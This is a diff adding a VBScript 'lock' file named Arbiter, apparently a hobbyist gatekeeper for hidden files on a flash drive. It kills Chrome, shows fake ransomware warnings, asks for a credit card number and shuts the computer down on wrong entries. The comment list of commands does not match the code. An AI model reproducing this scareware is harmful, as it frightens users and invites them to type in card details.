@@ -1,0 +1,134 @@
+'If you Have Found This File, You Have Unlocked the Key However, 
+'The Password is Found Below
+'Arbiter will be Watching Everything You do
+'Steps to Setup (Delete all Comments When Done Except for the Comments Above)
+'1. Setup Password 1 (Look for Line with "SysEnd()", use Ctrl + F)
+'2. Setup Password 2 (Same as Before, Except with Pass2)
+'3. Look for a Word Document (Get One-Letter Name and Path)
+'4. Look for a Movie to use (Get One-Letter Name and Path)
+'5. Save as a .vbs file
+'___________________________________________________________________________________________________________________________________________________________________
+strComputer = "." 'Start of Intimidation if Working
+Set objWMIService = GetObject("winmgmts:" _
+    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+ 
+Set colProcessList = objWMIService.ExecQuery _
+    ("Select * from Win32_Process Where Name = 'Chrome.exe'")
+ 
+Set oShell = CreateObject("WScript.Shell")
+For Each objProcess in colProcessList
+    oShell.Run "taskkill /im chrome.exe", , True
+Next
+
+
+Wscript.Echo "Your Computer Has Been Infected"
+Wscript.Echo "Your Files Have Been Encrypted"
+Trials = 0
+strAnswer = InputBox("Enter a Valid Credit Card Number to Get Your Files Back") 'Pass1
+If strAnswer = "SysEnd()" Then
+	Wscript.Quit
+End If
+If strAnswer = "SysPass()" Then
+	Do
+	If Trials = "5" Then
+		
+	Wscript.Echo "Your Computer is Uploading to Our Servers" 'Security Shutdown
+	strComputer = "." ' Local Computer
+	SET objWMIService = GETOBJECT("winmgmts:{impersonationLevel=impersonate,(Shutdown)}\\" & _
+	        		strComputer & "\root\cimv2")
+	
+	SET colOs = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+	 
+	FOR EACH objOs in colOs
+		objOs.Win32Shutdown(1)
+	NEXT
+		End If
+	
+		strAnswer = InputBox("What is Your Credit Card Number") 'Pass2
+		
+		If strAnswer = "" Then
+			Wscript.Echo "You Have not Given any Credit Card Number"
+			Trials = Trials + 1
+		Else
+			If strAnswer = "SysEnd()" Then
+	
+				Wscript.Quit
+			Else
+			Wscript.Echo "Please Enter a Valid Credit Card Number"
+			If strAnswer = "SysHelp()" Then
+				Wscript.Echo "Your Computer Has Been Taken Over By a Computer Virus"
+			End If
+			If strAnswer = "SysOff()" Then
+			strComputer = "." ' Local Computer
+			SET objWMIService = GETOBJECT("winmgmts:{impersonationLevel=impersonate,(Shutdown)}\\" & _
+	        				strComputer & "\root\cimv2")
+	
+			SET colOs = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+	 
+			FOR EACH objOs in colOs
+				objOs.Win32Shutdown(1)
+			NEXT
+			End If
+			End If
+		If strAnswer = "Vault Password Here" Then
+			CreateObject("WScript.Shell").Run("Vault Location Here")
+			Wscript.Quit
+		End If
+		End If
+		If strAnswer = "MovieName()" Then 'Put Your Movie Here
+			CreateObject("Wscript.Shell").Run("Movie Path")
+			Wscript.Quit
+		End If
+		If strAnswer = "`" Then
+			strComputer = "." ' Local Computer
+			SET objWMIService = GETOBJECT("winmgmts:{impersonationLevel=impersonate,(Shutdown)}\\" & _
+	        				strComputer & "\root\cimv2")
+
+			SET colOs = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+ 
+			FOR EACH objOs in colOs
+				objOs.Win32Shutdown(1)
+			NEXT
+		End If
+		If strAnswer = "WordDocNameHere()" Then
+			CreateObject("Wscript.Shell").Run("Doc Path")
+			Wscript.Quit
+		End If
+	Loop
+	Else
+		Wscript.Echo "Your Computer is Losing Files"
+		strComputer = "." ' Local Computer
+		SET objWMIService = GETOBJECT("winmgmts:{impersonationLevel=impersonate,(Shutdown)}\\" & _
+	        			strComputer & "\root\cimv2")
+	
+		SET colOs = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+	 
+		FOR EACH objOs in colOs
+			objOs.Win32Shutdown(1)
+		Next
+	End If
+	
+'_______________________________________________________________________________________________________________________________________________________
+'Delete The Comments Below
+'Info on Arbiter:
+'This is a Security Check File Used to Hide Files From People
+'These Files Belong to Cryptonium in 2119
+'Commands:
+'System Commands:
+'SysEnd(): End Program
+'SysOff(): Turns Off PC
+'SysPass(): Password for the First Passcode Lock
+'Miscellaneous:
+'Mov(): Play Movie
+'Hurricane(): Open Hurricane Documentary
+'Crypto2119: Open Hidden Files
+'Rules:
+'Arbiter Will Shut off Computer After 5 Fails in trying to pry Password
+'The First Question is Used to Intimidate the User and to Unlock the Vault
+'Answer the Questions With the 2nd Password to Open Files
+'The Files are HIDDEN in the Drive Located
+'This is Uploaded to Every CryptoDrive as a Defence
+'Materials:
+'-Sandisk File Vault
+'-Flashdrive
+'-Files to open as shortcut (Movie, Word Document, and other Files)
